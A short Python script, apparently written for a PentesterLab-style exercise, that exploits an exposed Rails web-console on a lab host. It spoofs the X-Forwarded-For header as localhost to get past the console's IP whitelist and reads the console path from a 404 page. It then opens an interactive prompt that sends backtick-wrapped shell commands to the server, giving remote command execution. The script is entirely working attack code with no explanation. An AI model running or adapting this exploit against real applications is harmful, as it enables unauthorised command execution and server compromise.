#!/usr/bin/python3
import requests
import re

url = 'http://ptl-9490475b-05746120.libcurl.so/'
header = {
    'X-Forwarded-For' : '::1'
}
response = requests.get(url + 'non-existing-page', headers=header)
console_remote_path = re.findall("data-remote-path='(.*)'", response.text)[0]
print (response.status_code) # should be 404
print(console_remote_path)

def web_console(url):
    while True:
        header = {
                'X-Forwarded-For': 'localhost', #::1 
                'Accept': 'application/vnd.web-console.v2',
                'X-Requested-With': 'XMLHttpRequest'
                }
        cmd = input("cmd> ")
        if cmd == 'exit' or cmd == 'quit':
            break
        elif cmd == ' ':
            continue
        
        cmd = '`'+cmd+'`'
        data = {'input':cmd}
        response = requests.put(url, data=data, headers=header)
        content = response.text.split('\\n')#[:-2]
        print(content)
        for line in content:
            line = line.strip('\\')
            line = line.split('"', -1)[-1]
            print(line)
web_console(url + console_remote_path)

